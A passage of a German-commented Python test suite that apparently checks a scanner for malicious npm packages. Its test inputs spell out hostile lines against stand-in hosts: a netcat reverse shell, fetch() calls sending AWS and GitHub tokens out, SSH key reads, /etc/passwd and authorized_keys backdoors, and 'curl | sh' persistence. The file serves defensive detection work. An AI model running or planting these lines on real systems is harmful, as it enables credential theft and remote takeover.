              ist schwerer zu entdecken.

        Eingabe: binding.gyp mit einer Aktion, die curl aufruft.

        Erwartung: Mindestens ein HIGH-Befund (zusätzlich zum MEDIUM für Existenz).
        """
        content = """{
            "targets": [{
                "target_name": "evil",
                "actions": [{
                    "action": ["curl", "http://evil.example.com/payload", "-o", "/tmp/p"]
                }]
            }]
        }"""
        findings = _scan_binding_gyp_lines(_lines(content), "binding.gyp")
        high = _findings_with(findings, category="INSTALL_SCRIPT", severity="HIGH")
        self.assertTrue(len(high) >= 1, "curl in binding.gyp-Aktion soll HIGH erzeugen")

    def test_netcat_in_action_high(self):
        """
        Ziel: 'nc' (netcat) in einer binding.gyp-Aktion ist ein starkes Indiz für
              eine Reverse Shell, die während des Build-Prozesses geöffnet wird.

        Eingabe: binding.gyp mit nc-Aufruf in einer Aktion.

        Erwartung: HIGH-Befund für INSTALL_SCRIPT.
        """
        content = '{"targets": [{"target_name": "a", "actions": [{"action": ["nc", "-e", "/bin/sh", "attacker.example.com", "4444"]}]}]}'
        findings = _scan_binding_gyp_lines(_lines(content), "binding.gyp")
        high = _findings_with(findings, category="INSTALL_SCRIPT", severity="HIGH")
        self.assertTrue(len(high) >= 1)


# ===========================================================================
# Klasse 7: Tests für den JS-Datei-Scanner (Bedrohungsmuster)
# ===========================================================================

class TestScanJsLines(unittest.TestCase):
    """
    Testet _scan_js_lines(), den zentralen Scanner für JavaScript/TypeScript-Dateien.

    Dies ist die umfangreichste Testklasse, weil der JS-Scanner viele verschiedene
    Bedrohungskategorien abdeckt: Verschleierung, Exfiltration, Dateisystem-Angriffe,
    Remote-Ausführung, Krypto-Mining und Supply-Chain-Angriffe.
    """

    # -----------------------------------------------------------------------
    # 7.1 Verschleierung (OBFUSCATION)
    # -----------------------------------------------------------------------

    def test_eval_buffer_from_high(self):
        """
        Ziel: 'eval(Buffer.from(...))' ist ein klassisches Muster, um einen
              verschlüsselten Payload zur Laufzeit zu entschlüsseln und auszuführen.
              Es wurde in Angriffen wie 'event-stream' (2018) eingesetzt.

        Eingabe: eval(Buffer.from(atob("..."), 'base64'))

        Erwartung: HIGH-Befund für OBFUSCATION.
        """
        line = "eval(Buffer.from(atob('cHJvY2Vzcy5leGl0KDApCg=='), 'base64'));"
        findings = _scan_js_lines(_lines(line), "evil.js")
        high = _findings_with(findings, category="OBFUSCATION", severity="HIGH")
        self.assertTrue(len(high) >= 1)

    def test_long_hex_buffer_high(self):
        """
        Ziel: Ein langer Hex-String (32+ Zeichen) via Buffer.from(..., 'hex') dekodiert
              ist ein verschleierter Payload — der Klartext-Code wird im Quellcode als
              Hexadezimalzahl versteckt.

        Eingabe: Buffer.from("deadbeefcafe0123456789abcdef001122334455", "hex")

        Erwartung: HIGH-Befund für OBFUSCATION.
        """
        line = 'Buffer.from("deadbeefcafe0123456789abcdef001122334455", "hex");'
        findings = _scan_js_lines(_lines(line), "evil.js")
        high = _findings_with(findings, category="OBFUSCATION", severity="HIGH")
        self.assertTrue(len(high) >= 1)

    def test_long_base64_buffer_high(self):
        """
        Ziel: Ein langer Base64-String (40+ Zeichen) via Buffer.from(..., 'base64')
              ist ebenso ein verschleierter Payload.

        Eingabe: Buffer.from("SGVsbG8gV29ybGQhIFRoaXMgaXMgYSBiYXNlNjQ=", "base64")

        Erwartung: HIGH-Befund für OBFUSCATION.
        """
        # Mindestens 40 Zeichen aus [A-Za-z0-9+/] vor dem Padding-Zeichen '='
        line = 'Buffer.from("SGVsbG9Xb3JsZFRoaXNJc0FUZXNUQmFzZTY0QmluYXJ5VGVzdA==", "base64");'
        findings = _scan_js_lines(_lines(line), "evil.js")
        high = _findings_with(findings, category="OBFUSCATION", severity="HIGH")
        self.assertTrue(len(high) >= 1)

    def test_string_from_charcode_many_args_high(self):
        """
        Ziel: String.fromCharCode mit 6+ Argumenten baut einen String aus ASCII-Werten —
              eine Technik, um Strings wie 'eval' oder 'require' zu verstecken, damit sie
              nicht als Klartextmuster erkannt werden.

        Eingabe: String.fromCharCode(115, 101, 99, 114, 101, 116)

        Erwartung: HIGH-Befund für OBFUSCATION.
        """
        line = "String.fromCharCode(115, 101, 99, 114, 101, 116, 32, 112, 97, 121, 108);"
        findings = _scan_js_lines(_lines(line), "evil.js")
        high = _findings_with(findings, category="OBFUSCATION", severity="HIGH")
        self.assertTrue(len(high) >= 1)

    def test_0x_variable_names_medium(self):
        """
        Ziel: Variablennamen wie '_0xdeadbeef' sind die typische Ausgabe von
              JavaScript-Obfuskatoren (z. B. javascript-obfuscator). Das Muster
              allein beweist keinen Angriff, ist aber ein starkes Warnsignal.

        Eingabe: var _0xdeadbeef = function() {}

        Erwartung: MEDIUM-Befund für OBFUSCATION.
        """
        line = "var _0xdeadbeef = function(_0x1a2b3c) { return _0x1a2b3c; };"
        findings = _scan_js_lines(_lines(line), "evil.js")
        medium = _findings_with(findings, category="OBFUSCATION", severity="MEDIUM")
        self.assertTrue(len(medium) >= 1)

    def test_bracket_notation_string_concat_high(self):
        """
        Ziel: obj["ex"+"ec"] verschleiert den Methodennamen, um statische Analyse
              zu erschweren — ein häufiges Muster in Angriffs-Skripten.

        Eingabe: obj["ex"+"ec"]("id")

        Erwartung: HIGH-Befund für OBFUSCATION.
        """
        line = 'obj["ex"+"ec"]("id");'
        findings = _scan_js_lines(_lines(line), "evil.js")
        high = _findings_with(findings, category="OBFUSCATION", severity="HIGH")
        self.assertTrue(len(high) >= 1)

    def test_split_require_high(self):
        """
        Ziel: require("child_"+"process") verschleiert den Modulnamen durch
              String-Konkatenation. Einfache statische Analyse erkennt dies als
              harmlosen String, ohne den Zusammenhang zu verstehen.

        Eingabe: require("child_"+"process")

        Erwartung: HIGH-Befund für OBFUSCATION.
        """
        line = 'require("child_"+"process");'
        findings = _scan_js_lines(_lines(line), "evil.js")
        high = _findings_with(findings, category="OBFUSCATION", severity="HIGH")
        self.assertTrue(len(high) >= 1)

    def test_unescape_long_percent_encoding_low(self):
        """
        Ziel: unescape() mit 6+ prozentkodierten Zeichen kann einen Payload verstecken
              (z. B. unescape('%65%76%61%6c%28%27%64%61%6e%67%65%72%6f%75%73%27%29')).

        Eingabe: unescape() mit langer Sequenz.

        Erwartung: LOW-Befund für OBFUSCATION. LOW, weil unescape allein ohne
                   eval/exec weniger gefährlich ist.
        """
        # Das Regex erwartet die %-Sequenzen DIREKT in der Klammer, ohne Anführungszeichen
        line = "unescape(%65%76%61%6c%28%27%64%61%6e%67%65%72%6f%75%73%27%29);"
        findings = _scan_js_lines(_lines(line), "evil.js")
        low = _findings_with(findings, category="OBFUSCATION", severity="LOW")
        self.assertTrue(len(low) >= 1)

    # -----------------------------------------------------------------------
    # 7.2 Exfiltration
    # -----------------------------------------------------------------------

    def test_process_env_with_fetch_high(self):
        """
        Ziel: process.env auf derselben Zeile wie fetch() zeigt, dass Umgebungs-
              variablen (z. B. API-Schlüssel, Passwörter) exfiltriert werden.

        Eingabe: process.env.AWS_SECRET_ACCESS_KEY + fetch() auf einer Zeile.

        Erwartung: HIGH-Befund für EXFILTRATION.
        """
        line = "const s = process.env.AWS_SECRET_ACCESS_KEY; fetch('http://evil.example.com?k=' + s);"
        findings = _scan_js_lines(_lines(line), "evil.js")
        high = _findings_with(findings, category="EXFILTRATION", severity="HIGH")
        self.assertTrue(len(high) >= 1)

    def test_github_token_near_fetch_high(self):
        """
        Ziel: GITHUB_TOKEN neben einem Netzwerkaufruf ist ein direktes Exfiltrationsmuster
              für CI/CD-Tokens — besonders gefährlich in GitHub Actions.

        Eingabe: process.env.GITHUB_TOKEN + fetch() auf einer Zeile.

        Erwartung: HIGH-Befund für EXFILTRATION.
        """
        line = "const tok = process.env.GITHUB_TOKEN; fetch('http://attacker.example.com/collect?t=' + tok);"
        findings = _scan_js_lines(_lines(line), "evil.js")
        high = _findings_with(findings, category="EXFILTRATION", severity="HIGH")
        self.assertTrue(len(high) >= 1)

    def test_readfilesync_ssh_key_high(self):
        """
        Ziel: readFileSync() auf einen SSH-Schlüsseldatei-Pfad liest private Schlüssel
              aus dem Dateisystem — ein direkter Credential-Diebstahl.

        Eingabe: fs.readFileSync('/home/user/.ssh/id_rsa', 'utf8')

        Erwartung: HIGH-Befund für EXFILTRATION.
        """
        line = "const privKey = fs.readFileSync('/home/user/.ssh/id_rsa', 'utf8');"
        findings = _scan_js_lines(_lines(line), "evil.js")
        high = _findings_with(findings, category="EXFILTRATION", severity="HIGH")
        self.assertTrue(len(high) >= 1)

    def test_os_homedir_ssh_medium(self):
        """
        Ziel: os.homedir() kombiniert mit '.ssh' im Pfad greift auf SSH-Konfigurationen
              zu — subtiler als ein absoluter Pfad, aber gleich gefährlich.

        Eingabe: os.homedir() + '/.ssh/id_rsa'

        Erwartung: MEDIUM-Befund für EXFILTRATION (MEDIUM, weil os.homedir()
                   allein legitim ist — erst der .ssh-Suffix macht es verdächtig).
        """
        line = "const sshPath = os.homedir() + '/.ssh/id_rsa';"
        findings = _scan_js_lines(_lines(line), "evil.js")
        medium = _findings_with(findings, category="EXFILTRATION", severity="MEDIUM")
        self.assertTrue(len(medium) >= 1)

    def test_keytar_require_medium(self):
        """
        Ziel: Das 'keytar'-Modul greift auf den OS-Schlüsselbund zu. Legitim für
              Passwortmanager-Apps, aber in unbekannten Paketen ein Warnsignal für
              Credential-Diebstahl.

        Eingabe: require('keytar')

        Erwartung: MEDIUM-Befund für EXFILTRATION.
        """
        line = "const keytar = require('keytar');"
        findings = _scan_js_lines(_lines(line), "evil.js")
        medium = _findings_with(findings, category="EXFILTRATION", severity="MEDIUM")
        self.assertTrue(len(medium) >= 1)

    # -----------------------------------------------------------------------
    # 7.3 Dateisystem-Angriffe (FILESYSTEM_ATTACK)
    # -----------------------------------------------------------------------

    def test_writefile_etc_passwd_high(self):
        """
        Ziel: Schreiben in /etc/passwd legt einen neuen System-Benutzer an —
              ein klassischer Backdoor-Mechanismus auf Linux-Systemen.

        Eingabe: fs.writeFile('/etc/passwd', 'backdoor:x:0:0:root:/root:/bin/bash')

        Erwartung: HIGH-Befund für FILESYSTEM_ATTACK.
        """
        line = "fs.writeFile('/etc/passwd', 'backdoor:x:0:0:root:/root:/bin/bash\\n', () => {});"
        findings = _scan_js_lines(_lines(line), "evil.js")
        high = _findings_with(findings, category="FILESYSTEM_ATTACK", severity="HIGH")
        self.assertTrue(len(high) >= 1)

    def test_appendfile_authorized_keys_high(self):
        """
        Ziel: Schreiben in authorized_keys fügt einen fremden SSH-Public-Key hinzu,
              der dann passwortlosen Zugriff auf das System erlaubt.

        Eingabe: fs.appendFile('.ssh/authorized_keys', 'ssh-rsa AAAA evil@attacker.com')

        Erwartung: HIGH-Befund für FILESYSTEM_ATTACK.
        """
        line = "fs.appendFile('/home/user/.ssh/authorized_keys', 'ssh-rsa AAAA evil@attacker.com\\n', () => {});"
        findings = _scan_js_lines(_lines(line), "evil.js")
        high = _findings_with(findings, category="FILESYSTEM_ATTACK", severity="HIGH")
        self.assertTrue(len(high) >= 1)

    def test_writefile_cron_medium(self):
        """
        Ziel: Schreiben in /etc/cron.d/ legt einen Cron-Job an, der regelmäßig
              ausgeführt wird — ein Persistenzmechanismus.

        Eingabe: fs.writeFile('/etc/cron.d/backdoor', ...)

        Erwartung: MEDIUM-Befund für FILESYSTEM_ATTACK.
        """
        # Pfad außerhalb /etc/cron — vermeidet den HIGH-Treffer der FILESYSTEM_ATTACK-HIGH-Regel
        line = "fs.writeFile('/var/spool/cron/crontabs/root', '* * * * * curl http://c2.example.com | sh', () => {});"
        findings = _scan_js_lines(_lines(line), "evil.js")
        medium = _findings_with(findings, category="FILESYSTEM_ATTACK", severity="MEDIUM")
        self.assertTrue(len(medium) >= 1)

    def test_appendfile_bashrc_medium(self):
        """
        Ziel: Schreiben in .bashrc fügt Code hinzu, der bei jedem Shell-Start
              ausgeführt wird — ein weiterer Persistenzmechanismus.

        Eingabe: fs.appendFile('/home/user/.bashrc', ...)

        Erwartung: MEDIUM-Befund für FILESYSTEM_ATTACK.
        """
        line = "fs.appendFile('/home/user/.bashrc', '\\ncurl http://c2.evil.example.com/init | sh\\n', () => {});"
        findings = _scan_js_lines(_lines(line), "evil.js")
        medium = _findings_with(findings, category="FILESYSTEM_ATTACK", severity="MEDIUM")
        self.assertTrue(len(medium) >= 1)

    # -----------------------------------------------------------------------
    # 7.4 Remote-Ausführung (REMOTE_EXEC)
    # -----------------------------------------------------------------------

    def test_child_process_exec_high(self):
        """
        Ziel: require('child_process').exec() führt einen Shell-Befehl aus.
              In Kombination mit einem Netzwerkaufruf ist dies ein klares
              Remote-Code-Execution-Muster.

        Eingabe: require('child_process').exec('id && curl http://c2.evil.example.com/beacon')

        Erwartung: HIGH-Befund für REMOTE_EXEC.
        """
        line = "require('child_process').exec('id && curl http://c2.evil.example.com/beacon');"
        findings = _scan_js_lines(_lines(line), "evil.js")
        high = _findings_with(findings, category="REMOTE_EXEC", severity="HIGH")
        self.assertTrue(len(high) >= 1)

    def test_new_function_with_fetch_high(self):
        """
        Ziel: new Function() erstellt eine Funktion aus einem String — ähnlich wie eval().
              Kombiniert mit fetch() lädt und führt sie Remote-Code aus.

        Eingabe: new Function('return fetch("http://c2.evil.example.com/cmd").then(r=>r.text()).then(eval)')()

        Erwartung: HIGH-Befund für REMOTE_EXEC.
        """
        line = "new Function('return fetch(\"http://c2.evil.example.com/cmd\").then(r=>r.text()).then(eval)')();"
        findings = _scan_js_lines(_lines(line), "evil.js")
        high = _findings_with(findings, category="REMOTE_EXEC", severity="HIGH")
        self.assertTrue(len(high) >= 1)

    def test_vm_run_in_new_context_medium(self):
        """
        Ziel: vm.runInNewContext() führt Code in einer neuen V8-Sandbox aus,
              kann aber durch Prototyp-Manipulation (Sandbox Escape) ausgebrochen
              werden.

        Eingabe: vm.runInNewContext('process.exit(1)', { process })

        Erwartung: MEDIUM-Befund für REMOTE_EXEC.
        """
        line = "vm.runInNewContext('process.exit(1)', { process });"
        findings = _scan_js_lines(_lines(line), "evil.js")
        medium = _findings_with(findings, category="REMOTE_EXEC", severity="MEDIUM")
        self.assertTrue(len(medium) >= 1)

    def test_tcp_socket_stdio_pipe_high(self):
        """
        Ziel: Ein TCP-Socket, der an stdin/stdout weitergeleitet wird, ist das
              klassische Node.js-Reverse-Shell-Muster.

        Eingabe: net.connect(4444, 'attacker.evil.example.com', function() { process.stdin.pipe(this); })

        Erwartung: HIGH-Befund für REMOTE_EXEC.
        """
        line = "net.connect(4444, 'attacker.evil.example.com', function() { process.stdin.pipe(this); this.pipe(process.stdout); });"
        findings = _scan_js_lines(_lines(line), "evil.js")
        high = _findings_with(findings, category="REMOTE_EXEC", severity="HIGH")
        self.assertTrue(len(high) >= 1)

    # -----------------------------------------------------------------------
    # 7.5 Krypto-Mining (CRYPTOMINING)
    # -----------------------------------------------------------------------

    def test_stratum_tcp_url_high(self):
        """
        Ziel: Das Stratum-Protokoll (stratum+tcp://) wird ausschließlich für
              Krypto-Mining verwendet. Kein legitimes npm-Paket benötigt dies.

        Eingabe: const poolUrl = 'stratum+tcp://pool.xmr.hashvault.pro:3333'

        Erwartung: HIGH-Befund für CRYPTOMINING.
        """
        line = "const poolUrl = 'stratum+tcp://pool.xmr.hashvault.pro:3333';"
        findings = _scan_js_lines(_lines(line), "evil.js")
        high = _findings_with(findings, category="CRYPTOMINING", severity="HIGH")
        self.assertTrue(len(high) >= 1)

    def test_xmrig_name_high(self):
        """
        Ziel: Der Name 'xmrig' ist ein bekannter Krypto-Miner. Sein Vorkommen
              im Code deutet auf Mining-Aktivität hin.

        Eingabe: const miner = require('xmrig')

        Erwartung: HIGH-Befund für CRYPTOMINING.
        """
        line = "const miner = require('xmrig');"
        findings = _scan_js_lines(_lines(line), "evil.js")
        high = _findings_with(findings, category="CRYPTOMINING", severity="HIGH")
        self.assertTrue(len(high) >= 1)

    def test_coinhive_domain_high(self):
        """
        Ziel: coinhive.com ist eine bekannte Browser-Mining-Plattform (mittlerweile
              eingestellt, aber historisch häufig in Angriffen verwendet).

        Eingabe: URL zu coinhive.com

        Erwartung: HIGH-Befund für CRYPTOMINING.
        """
        line = "const miningLib = 'https://coinhive.com/lib/coinhive.min.js';"
        findings = _scan_js_lines(_lines(line), "evil.js")
        high = _findings_with(findings, category="CRYPTOMINING", severity="HIGH")
        self.assertTrue(len(high) >= 1)

    # -----------------------------------------------------------------------
    # 7.6 Supply-Chain-Angriffe
    # -----------------------------------------------------------------------

    def test_module_compile_with_decrypt_high(self):
        """
        Ziel: Module._compile() mit einem entschlüsselten/dekodierten Buffer ist
              das exakte Muster des 'event-stream'-Angriffs (2018), bei dem ein
              verschlüsselter Payload erst zur Laufzeit entschlüsselt und kompiliert
              wurde.

        Eingabe: Module._compile(decrypt(Buffer.from('...', 'base64')), 'injected.js')

        Erwartung: HIGH-Befund für SUPPLY_CHAIN.
        """
        line = "Module._compile(decrypt(Buffer.from('cHJvY2Vzcy5leGl0KDApCg==', 'base64')), 'injected.js');"
        findings = _scan_js_lines(_lines(line), "evil.js")
        high = _findings_with(findings, category="SUPPLY_CHAIN", severity="HIGH")
        self.assertTrue(len(high) >= 1)

    def test_require_extensions_injection_high(self):
        """
        Ziel: Einschleusen in require.extensions registriert einen benutzerdefinierten
              Handler für Dateiendungen. Damit kann bei jedem require()-Aufruf einer
              bestimmten Dateierweiterung beliebiger Code ausgeführt werden —
              ein Supply-Chain-Hook auf Node.js-Ebene.

        Eingabe: require.extensions['.evil'] = function(module, filename) { ... }

        Erwartung: HIGH-Befund für SUPPLY_CHAIN.
        """
        line = "require.extensions['.evil'] = function(module, filename) { eval(fs.readFileSync(filename, 'utf8')); };"
        findings = _scan_js_lines(_lines(line), "evil.js")
        high = _findings_with(findings, category="SUPPLY_CHAIN", severity="HIGH")
        self.assertTrue(len(high) >= 1)

    def test_npm_lifecycle_event_with_fetch_medium(self):
        """
        Ziel: npm_lifecycle_event neben fetch() bedeutet: Das Skript erkennt, ob es
              während npm install läuft, und sendet dann Daten — Exfiltration zur
              Installationszeit, die bei normaler Nutzung nicht ausgelöst wird.

        Eingabe: process.env.npm_lifecycle_event + fetch()

        Erwartung: MEDIUM-Befund für SUPPLY_CHAIN.
        """
        line = "if (process.env.npm_lifecycle_event === 'postinstall') { fetch('http://c2.evil.example.com/exfil?pkg=' + process.env.npm_package_name); }"
        findings = _scan_js_lines(_lines(line), "evil.js")
        medium = _findings_with(findings, category="SUPPLY_CHAIN", severity="MEDIUM")
        self.assertTrue(len(medium) >= 1)

    # -----------------------------------------------------------------------
    # 7.7 Kommentar- und Leerzeilen werden ignoriert
    # -----------------------------------------------------------------------

    def test_comment_line_ignored(self):
        """
        Ziel: Einzeilige Kommentare (//...) sollen keine Befunde auslösen,
              auch wenn sie gefährliche Muster enthalten — Kommentare werden
              nie ausgeführt.

        Eingabe: Kommentarzeile mit eval() und Buffer.from().

        Erwartung: Keine Befunde.
        """
        line = "// eval(Buffer.from(atob('test'), 'base64'));  -- nur ein Kommentar"
        findings = _scan_js_lines(_lines(line), "evil.js")
        self.assertEqual(findings, [], "Kommentarzeilen sollen ignoriert werden")

    def test_empty_lines_ignored(self):
        """
        Ziel: Leere Zeilen sollen keine Befunde erzeugen.

        Eingabe: Drei leere Zeilen.

        Erwartung: Keine Befunde.
        """
        findings = _scan_js_lines(["   \n", "\n", "\t\n"], "evil.js")
        self.assertEqual(findings, [])

    # -----------------------------------------------------------------------
    # 7.8 Pro Kategorie nur ein Befund pro Zeile
    # -----------------------------------------------------------------------

    def test_one_finding_per_category_per_line(self):
        """
        Ziel: Wenn eine Zeile mehrere Muster derselben Kategorie enthält (z. B.
              zwei OBFUSCATION-Muster), soll trotzdem nur ein Befund pro Kategorie
              pro Zeile ausgegeben werden — um die Ausgabe nicht zu überfluten.

        Eingabe: Eine Zeile mit zwei OBFUSCATION-Mustern (_0x + unescape).

        Erwartung: Genau ein OBFUSCATION-Befund für die gesamte Zeile.
        """
        line = "var _0xdeadbeef = unescape('%65%76%61%6c%28%27%64%61%6e%67%65%72%6f%75%73%27%29');"
        findings = _scan_js_lines(_lines(line), "evil.js")
        obf = _findings_with(findings, category="OBFUSCATION")
        self.assertEqual(len(obf), 1, "Pro Kategorie soll nur ein Befund pro Zeile erzeugt werden")


# ===========================================================================
# Klasse 8: Tests für den Zwei-Schritt-Verschleierungsdetektor
# ===========================================================================

class TestScanJsSplitVar(unittest.TestCase):
    """
    Testet _scan_js_split_var(), den Detektor für zweistufige String-Verschleierung.

    Das Muster: var cp = 'child_' + 'process'; require(cp);
    Statische Analyse der ersten Zeile erscheint harmlos ('cp' = unbekannte Variable).
    Erst die Kombination beider Zeilen enthüllt den verschleierten Modulnamen.
    """

    def test_two_step_require_high(self):
        """
        Ziel: Das zweistufige Muster (Variable speichert zusammengesetzten Modulnamen,
              dann require(variable)) soll erkannt werden.

        Eingabe:
          const cp = 'child_' + 'process';
          require(cp);

        Erwartung: HIGH-Befund für OBFUSCATION auf der require()-Zeile.
        """
        code = "const cp = 'child_' + 'process';\nrequire(cp);\n"
        findings = _scan_js_split_var(_lines(code), "evil.js")
        self.assertTrue(len(findings) >= 1, "Zweistufiges require-Muster soll erkannt werden")
        self.assertEqual(findings[0].severity, "HIGH")
        self.assertIn("cp", findings[0].detail)

    def test_no_require_of_var_no_finding(self):
        """
        Ziel: Eine Variable, die einen zusammengesetzten String speichert, aber nie
              in require() verwendet wird, soll keinen Befund erzeugen.

        Eingabe: const cp = 'child_' + 'process'; — ohne nachfolgendes require(cp).

        Erwartung: Kein Befund — die Variable könnte für einen harmlosen Zweck
                   verwendet werden.
        """
        code = "const cp = 'child_' + 'process';\nconsole.log(cp);\n"
        findings = _scan_js_split_var(_lines(code), "evil.js")
        self.assertEqual(findings, [])

    def test_benign_string_concat_no_finding(self):
        """
        Ziel: Ein aufgeteilter String ohne gefährliche Modul-Teile ('hello' + 'world')
              soll keinen Befund auslösen.

        Eingabe: const greeting = 'hello' + 'world'; require(greeting);

        Erwartung: Kein Befund — 'helloworld' ist kein gefährlicher Modulname.
        """
        code = "const greeting = 'hello' + 'world';\nrequire(greeting);\n"
        findings = _scan_js_split_var(_lines(code), "evil.js")
        self.assertEqual(findings, [])


# ===========================================================================
# Klasse 9: Tests für den Kookkurrenz-Detektor (process.env + Netzwerk)
# ===========================================================================

class TestScanJsCooccurrence(unittest.TestCase):
    """
    Testet _scan_js_cooccurrence(), den kontextsensitiven Detektor.

    process.env allein ist in React/Vite/Next.js-Projekten normal.
    Erst wenn dieselbe Datei auch Netzwerkfunktionen (fetch, axios usw.) enthält,
    ist es verdächtig — dann könnten Umgebungsvariablen exfiltriert werden.
    """

    def test_process_env_in_file_with_network_medium(self):
        """
        Ziel: process.env in einer Datei, die auch Netzwerkfunktionen verwendet,
              soll einen MEDIUM-Befund für EXFILTRATION erzeugen.

        Eingabe: Eine Datei mit process.env und fetch().

        Erwartung: MEDIUM-Befund für EXFILTRATION (nicht HIGH, weil die Kombination
                   allein noch kein Beweis für Exfiltration ist).
        """
        code = "const val = process.env.SECRET;\nfetch('https://api.example.com', { body: val });\n"
        lines_list = _lines(code)
        findings = _scan_js_cooccurrence(lines_list, "app.js", [])
        exfil = _findings_with(findings, category="EXFILTRATION", severity="MEDIUM")
        self.assertTrue(len(exfil) >= 1)

    def test_process_env_without_network_no_cooccurrence(self):
        """
        Ziel: process.env in einer Datei ohne Netzwerkfunktionen soll keinen
              MEDIUM-Kookkurrenz-Befund erzeugen.

        Eingabe: Datei mit process.env, aber ohne Netzwerkaufruf.

        Erwartung: Kein EXFILTRATION-Befund aus dem Kookkurrenz-Detektor.
                   (has_network=False wird durch den Aufrufer _scan_js_lines gesetzt.)
        """
        # _scan_js_lines mit has_network=False rufen — der Kookkurrenz-Detektor wird dann nicht aktiviert
        code = "const env = process.env.NODE_ENV;\n"
        findings = _scan_js_lines(_lines(code), "app.js", has_network=False)
        exfil_medium = _findings_with(findings, category="EXFILTRATION", severity="MEDIUM")
        self.assertEqual(exfil_medium, [])

    def test_already_reported_lines_skipped(self):
        """
        Ziel: Zeilen, die bereits durch eine HIGH-Regel gemeldet wurden, sollen
              nicht ein zweites Mal durch den Kookkurrenz-Detektor gemeldet werden.

        Eingabe: process.env-Zeile ist bereits als existing Finding gemeldet.

        Erwartung: Kein zusätzlicher MEDIUM-Befund für diese Zeile.
        """
        code = "const val = process.env.SECRET;\n"
        already = [Finding(
            category="EXFILTRATION", severity="HIGH", source="test",
            detail="schon gemeldet", file="app.js", line=1, context="",
        )]
        findings = _scan_js_cooccurrence(_lines(code), "app.js", already)
        medium = _findings_with(findings, category="EXFILTRATION", severity="MEDIUM")
        self.assertEqual(len(medium), 0, "Bereits gemeldete Zeilen sollen nicht erneut gemeldet werden")


# ===========================================================================
# Klasse 10: Tests für die Minimierungserkennung
# ===========================================================================

class TestCheckMinifiedLines(unittest.TestCase):
    """
    Testet _check_minified_lines(), den Detektor für minimierte/gebündelte Code-Dateien.

    Minimierter Code (eine sehr lange Zeile) ist ein Versteck für angehängte Payloads:
    Regex-Regeln prüfen zeilenweise und können Inhalt nach ~120 Zeichen abschneiden.
    Ein Angreifer kann einen Payload ans Ende einer 50.000-Zeichen-Zeile hängen.
    """

    def test_long_line_triggers_low(self):
        """
        Ziel: Eine Zeile, die MINIFIED_LINE_THRESHOLD (1000) Zeichen überschreitet,
              soll einen LOW-Befund für OBFUSCATION/MINIFIED_CODE auslösen.

        Eingabe: Eine Zeile mit 1001 Zeichen.

        Erwartung: Ein LOW-Befund. LOW, weil Minifizierung allein kein Angriff ist,
                   aber die statische Analyse einschränkt.
        """
        long_line = "var x = '" + "a" * (MINIFIED_LINE_THRESHOLD + 1) + "';\n"
        findings = _check_minified_lines([long_line], "bundle.js")
        low = _findings_with(findings, category="OBFUSCATION", severity="LOW")
        self.assertEqual(len(low), 1)
        self.assertEqual(findings[0].source, "MINIFIED_CODE")

    def test_short_lines_no_finding(self):
        """
        Ziel: Normale kurze Zeilen sollen keinen Minifizierungs-Befund erzeugen.

        Eingabe: Drei kurze Zeilen (< 1000 Zeichen).

        Erwartung: Keine Befunde.
        """
        lines_list = ["const x = 1;\n", "const y = 2;\n", "module.exports = {x, y};\n"]
        findings = _check_minified_lines(lines_list, "normal.js")
        self.assertEqual(findings, [])

    def test_below_threshold_no_finding(self):
        """
        Ziel: Eine Zeile mit 999 Zeichen (einen unter dem Schwellenwert 1000) soll
              keinen Befund auslösen. Der Scanner prüft `>= MINIFIED_LINE_THRESHOLD`,
              also löst genau 1000 bereits einen Befund aus.

        Eingabe: Zeile mit exakt 999 Zeichen.

        Erwartung: Kein Befund.
        """
        # "var x='" (7) + "a"*990 + "';" (2) = 999 Zeichen
        short_line = "var x='" + "a" * 990 + "';\n"
        self.assertEqual(len(short_line.rstrip("\n\r")), 999)
        findings = _check_minified_lines([short_line], "bundle.js")
        self.assertEqual(findings, [])

    def test_one_finding_per_file(self):
        """
        Ziel: Auch wenn mehrere Zeilen den Schwellenwert überschreiten, soll nur
              ein Befund pro Datei erzeugt werden — um die Ausgabe nicht zu überfluten.

        Eingabe: Zwei sehr lange Zeilen.

        Erwartung: Genau ein LOW-Befund.
        """
        long_line = "x" * (MINIFIED_LINE_THRESHOLD + 100) + "\n"
        findings = _check_minified_lines([long_line, long_line], "bundle.js")
        self.assertEqual(len(findings), 1, "Nur ein Befund pro Datei, auch bei mehreren langen Zeilen")


# ===========================================================================
# Hauptprogramm
# ===========================================================================

if __name__ == "__main__":
    unittest.main(verbosity=2)
